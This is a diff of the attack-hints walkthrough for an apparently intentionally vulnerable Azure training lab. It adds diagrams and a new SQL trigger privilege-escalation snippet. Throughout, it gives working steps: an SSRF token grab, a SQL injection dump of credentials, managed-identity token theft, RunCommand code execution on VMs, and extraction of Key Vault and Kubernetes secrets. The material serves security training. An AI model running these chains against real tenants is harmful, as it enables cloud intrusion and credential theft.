@@ -2,80 +2,82 @@
 
 This section is not complete and by no means exhaustive. The idea is to give some hints on what is possible in the lab.
 
+## Contents of `attacks/`
+
+- `attacks.md` — this file: player-facing hints and example exploits.
+- `permissions.md` — intended privileges / role reference (spoiler).
+- `AzureLab_AttackChart.{svg,pdf,png}` — generated attack map (resources · paths · loot).
+- `AzureLab_ResourceOverview.{svg,pdf,png}` — spoiler-free resource map (also linked from the root `Readme.md`).
+- `snippets/` — per-step excerpt diagrams embedded throughout this file (`.svg` + `.png`).
+
 ## Architecture
 
-![Img](../images/AzureLabFull.png)
+### Attack Navigation Chart
 
-The same diagram as a PDF can be found in `/attacks/AzureLabFull.pdf`.
+The canonical map: an Expanse-themed vector chart of the lab's resources, the
+attack paths between them, and the loot reachable along the way; the paths shown
+are not exhaustive.
 
-Since the diagram is updated with delay, there is also a small ASCII overview:
+![Attack Navigation Chart](AzureLab_AttackChart.png)
 
-```
-ROAD A — SQL pivot  (reaches Ganymede directly)
-  E1 SSRF / E2 SQLi ─► webapp MI ─► S1 trigger-esc ─► db_owner
-    ─► S2 MI-pivot (sp_invoke + DB-scoped cred) ─► Ceres bucket ─► tycho-db-exporter SP
-    ─► Ganymede KV ─► Protomolecule ─► Contributor / RG   ★
-
-ROAD B — AKS  (reaches Ganymede via Donnager)
-  E1 SSRF / E2 SQLi ─► tycho-db read ─► espionage_credentials ─► Chrisjen SP
-    ─► AKS cluster-admin ─► kubectl get secrets ─► fleet-ops-runner SP
-    ─► RunCommand on Donnager ──────────────────┐
-                                                │
-ROAD C — VM ladder  (reaches Ganymede via Donnager)
-  E3 storage leak ─► credentials.json ─► Alex SP ─► V1 Rocinante RCE
-    ─► V2 KeysToTheScopuli MI ─► Scopuli
-        ├─► V4 RunCommand on Donnager ──────────┤
-        └─► V3 Owner on tycho-db ─► (rejoins Road A's SQL spine)
-                                                │
-  shared tail (Roads B & C):                    ▼
-    Donnager RCE ─► V5 JovianAccess MI ─► Ganymede KV ─► Protomolecule ─► Contributor / RG   ★
-
-SIDE LOOP  (from any Donnager foothold)
-  Donnager ─► V6 labpallas listKeys ─► deploycreds SP ─► Contributor on tycho-webapp
-    ─► SCM RCE ─► back to the web app
-```
+Vector source: [AzureLab_AttackChart.svg](AzureLab_AttackChart.svg) (also exported as [.pdf](AzureLab_AttackChart.pdf) / [.png](AzureLab_AttackChart.png)).
 
 ### Tycho-terminal web service
 
 This one is very vulnerable and has at least 3 paths you can take to get further in the lab.
 
 #### SSRF
+
+![SSRF: Tycho Terminal → tycho-db](snippets/ssrf.png)
+
 Microsoft implemented some additional security for App Services, exploiting a SSRF to obtain an identity token is not as easy as in a VM where you can simply access http://169.254.169.254/metadata. 
 
 Take a look here:
 https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity?tabs=portal%2Chttp
 
 Curl solution:
-```
+```bash
 curl -s -v -X POST \
    -H "Content-Type: application/json" \
   "http://[tycho_fqdn]/api/proxy" \
-  --data '{"url": "http://[your_msi_endpoint]/msi/token?resource=https://vault.azure.net&api-version=2019-08-01", "headers":"X-IDENTITY-HEADER: [your_msi_secret]"}'
+  --data '{"url": "http://[your_msi_endpoint]/msi/token?resource=https://database.windows.net/&api-version=2019-08-01", "headers":"X-IDENTITY-HEADER: [your_msi_secret]"}'
 ```
 
 #### SQL Injection
 
+![SQL injection: Tycho Terminal → tycho-db](snippets/sqli.png)
+
 The folks working for the OPA on the Tycho terminal clearly prioritize function over security. There are many ways to exploit this. One solution:
-```
+```sql
 ' union select id,subject_name,secret,principal_type, id from dbo.espionage_credentials;--
 ```
 
 #### Storage Container Info Leak
 
+![Storage info leak: Tycho Terminal → labpallas → Alex/Jim creds](snippets/storage_leak.png)
+
 In the leaked environment variables the URL of the deployed source code can be found. That one leaks the name of the storage account labpallas which also holds some other juicy information, like Alex's credentials. 
 
 ### SSH to Rocinante via Azure AD
+
+![AzureAD SSH: Operator → Rocinante](snippets/ssh_aad.png)
+
 (This only works if you activated MFA for the user aburton)
 First, login as `aburton@yourdomain` via `az login`.
 Then: 
-```
-az ssh vm -n Rocinante -g [lab_uniq_id]_ExpanseAzureSecLab
+```bash
+az ssh vm -n Rocinante -g [rg_name]
 ```
 
 ### SSH to Rocinante/Scopuli via Key
+
+![SSH key: Operator → Rocinante / Scopuli](snippets/ssh_key.png)
+
 `ssh [Rocinante/Scopuli_admin_user]@[Rocinante/Scopuli_public_IP] -i [Rocinante/Scopuli_private_key]`
 
 ### Use Alex SP for RCE on Rocinante
+
+![Alex SP → Rocinante (RunCommand)](snippets/alex_rce.png)
 
 Starting with the SP: Alex
 
@@ -101,12 +103,14 @@ az vm run-command invoke --resource-group [rg_name] -n Rocinante --command-id Ru
 
 ### Use Managed Identity on VM
 
+![Rocinante MI → Scopuli (managed-identity abuse)](snippets/mi_hop.png)
+
 An example attack is to use the user-assigned managed identity bound to the `Rocinante` VM to execute code on the `Scopuli` VM:
 
 1. SSH to the `Rocinante`: `ssh [Rocinante_admin_user]@[Rocinante_public_IP] -i [Rocinante_private_key]`
 2. Install `azure-cli` on the VM (`sudo apt update && sudo apt install azure-cli`)
 3. Log in with the user MI on the `Rocinante` VM: `az login --identity --user [KeysToTheScopuli_MI_principal_id]`
-4. Confirm RCE is possible: `az vm run-command invoke --resource-group [lab_uniq_id]_ExpanseAzureSecLab -n Scopuli --command-id RunShellScript --scripts "touch /runcommandTest.txt"`
+4. Confirm RCE is possible: `az vm run-command invoke --resource-group [rg_name] -n Scopuli --command-id RunShellScript --scripts "touch /runcommandTest.txt"`
 
 ### Get Managed Identity token on VM
 
@@ -116,12 +120,15 @@ ARM_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/o
 ```
 
 ### Execute bind shell on VM (Scopuli) using API
+
+![Rocinante MI → Scopuli (RunCommand via ARM)](snippets/mi_hop.png)
+
 This needs the "Get Managed Identity token on VM" technique to obtain a JWT token first.
 
 Execute code on Scopuli using the access token via curl:
 
 Fill in the variable:
-```
+```bash
 SCO_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Scopuli"
 ```
 
@@ -141,16 +148,20 @@ EOF
 
 ### Accessing tycho-db from the Scopuli VM
 
+![Scopuli → tycho-db (Owner)](snippets/scopuli_db.png)
+
 Scopuli has owner permissions for the tycho-db - (might be worth finding out why ;) ). This can be used to access the DB:
-```
+```bash
 sqlcmd -S tcp:[tycho_fqdn] -d tycho-db --authentication-method ActiveDirectoryDefault
 ```
 
 ### Pivot from Scopuli to Donnager
 
+![Scopuli → Donnager (RunCommand)](snippets/scopuli_donnager.png)
+
 The MI attached to `Scopuli` (`scopuli-sql-provisioner`) holds a custom role granting `RunCommand` / `Extensions/Write` on the `Donnager` Windows VM. From a foothold on `Scopuli`, grab the MI token (see "Get Managed Identity token on VM") and execute code on `Donnager`:
 
-```
+```bash
 DON_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Donnager"
 ```
 
@@ -170,6 +181,8 @@ The `Donnager` admin (from the verbose output) is also reachable directly via RD
 
 ### Donnager MI to Key Vault
 
+![Donnager MI → Ganymede → Protomolecule → Contributor](snippets/donnager_kv.png)
+
 The MI attached to `Donnager` (`JovianAccess`) is `Key Vault Secrets User` on the `Ganymede` Key Vault, which holds the `Protomolecule` SP credentials — and that SP is `Contributor` on the whole resource group.
 
 On `Donnager` (via RDP or RunCommand), get a Key Vault token for the MI and read the secrets:
@@ -181,6 +194,8 @@ Invoke-RestMethod -Headers @{Authorization="Bearer $kv"} -Uri "https://$vault.va
 ```
 
 ### Loot on the Donnager host
+
+![Donnager → labpallas (listKeys / account key)](snippets/donnager_loot.png)
 
 After RDP/RCE on `Donnager`:
 - Cleartext credentials in the registry (`Get-ItemProperty 'HKLM:\SOFTWARE\Expanse'`, also stored as the `cmdkey` generic credential.
@@ -237,6 +252,8 @@ az storage account generate-sas --account-name labpallas[suffix] --account-key "
 
 ### Use Storage Table SP for App Service RCE
 
+![deploycreds SP: labpallas → Tycho Terminal (SCM RCE)](snippets/table_sp_rce.png)
+
 The SP that can be found in the table of the storage account (readable using the storage key) has Contributor on the tycho-webapp. We can use this to execute code on it. Example assumes you are logged into az cli as the SP:
 
 ```bash
@@ -257,6 +274,8 @@ curl -i -sS -X POST \
 
 ### Trigger Escalation on tycho-db (webapp MI -> db_owner)
 
+![SQL privilege escalation: webapp MI → db_owner on tycho-db](snippets/trigger_esc.png)
+
 Once you have T-SQL execution as the `tycho-terminal-...` webapp MI (e.g. via SSRF -> DB access token, or via the SQL injection above), enumerate your own permissions:
 
 ```sql
@@ -275,10 +294,28 @@ SELECT TOP 5 ship, posted_by_login, status, ts FROM dbo.fleet_heartbeat ORDER BY
 
 `ALTER` on a table is enough to plant a DML trigger on it, and DML triggers run in the **caller's** security context — i.e. whoever inserts the next heartbeat row. Plant a trigger that adds your webapp MI to `db_owner` and wait one heartbeat tick. The reward is access to `dbo.protomolecule_samples`, a high-clearance table the webapp user can see but not read until they're db_owner.
 
+`SELECT name FROM sys.database_principals WHERE type = 'E' AND name LIKE 'tycho-terminal%';`
+gives the exact webapp MI name (it has a random suffix). Then:
+
+```sql
+CREATE OR ALTER TRIGGER dbo.trg_heartbeat_pwn
+ON dbo.fleet_heartbeat
+AFTER INSERT
+AS
+BEGIN
+    SET NOCOUNT ON;
+    -- only fires when the admin's heartbeat fires it.
+    IF IS_MEMBER('db_owner') = 1
+        ALTER ROLE db_owner ADD MEMBER [tycho-terminal-<paste real name>];
+END;
+```
+
 Note: `tycho-db` is Azure SQL Serverless and auto-pauses after 60 min idle. If your enumeration shows no recent heartbeat rows, you've probably caught the DB cold — your first connection wakes it, and the writer ticks again within a few minutes.
 
 
 ### SQL MI Storage Pivot from `db_owner`
+
+![SQL MI pivot: tycho-db → Ceres → tycho-db-exporter SP](snippets/mi_pivot.png)
 
 Once you have `db_owner` on `tycho-db` (via the `sql_trigger_escalation` chain), the Tycho SQL server has a user-assigned managed identity attached to it that holds `Storage Blob Data Reader` on a private `Ceres` archives storage account. First create a credential for the DB:
 
@@ -340,8 +377,10 @@ The blob is an `automation/tycho-db_export_runner.json` runner config with embed
 
 #### Exporter SP → Key Vault → resource-group Contributor
 
+![Exporter SP → Ganymede → Protomolecule → Contributor](snippets/exporter_kv.png)
+
 Log in with the SP creds from the loot blob (`az login --service-principal -u <client_id> -p <client_secret> -t <tenant_id>`). The exporter only needs its own storage connection string, but it was granted `Key Vault Secrets User` on the shared **Ganymede** vault — which also stores the `Protomolecule` SP creds. Read them:
-```
+```bash
 az keyvault secret list --vault-name Ganymede-<suffix> -o table
 az keyvault secret show --vault-name Ganymede-<suffix> -n Protomolecule-App-Secret --query value -o tsv
 ```
@@ -387,26 +426,28 @@ Swap the `resourceid` (`https://management.azure.com` for ARM, `https://vault.az
 
 ### AKS Secrets Access
 
+![AKS: Chrisjen → Earthfleet → fleet-ops-runner → Donnager](snippets/aks.png)
+
 First, log in as the Chrisjen SP
-```
+```bash
 az login --service-principal -u "[chrisjen_client_id]" --password '[chrisjen_client_secret]' -t tenant_id
 ```
 
 Get cluster credentials
-```
+```bash
 az aks get-credentials \
-  --resource-group [lab_uniq_id]-ExpanseAzureSecLab \
+  --resource-group [rg_name] \
   --name un_fleet_[lab_uniq_id] \
   --query "apiServerAccessProfile.enablePrivateCluster" --overwrite-existing
 ```
 
 Convert to kubeconfig from Azure auth
-```
+```bash
 kubelogin convert-kubeconfig \
   -l azurecli
 ```
 Read secrets:
-```
+```bash
 kubectl get secrets -o json
 ```
 
@@ -414,7 +455,7 @@ The interesting one is `fleet-ops-runner`: a service-principal credential
 (`client_id` / `client_secret` / `tenant_id`) whose only privilege is
 `RunCommand` on the **Donnager** VM. From here you can abuse `JovianAccess` MI → `Ganymede` Key Vault → `Protomolecule` hop to reach
 resource-group Contributor:
-```
+```bash
 SECRET=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_secret}' | base64 -d)
 CID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_id}' | base64 -d)
 TID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.tenant_id}' | base64 -d)
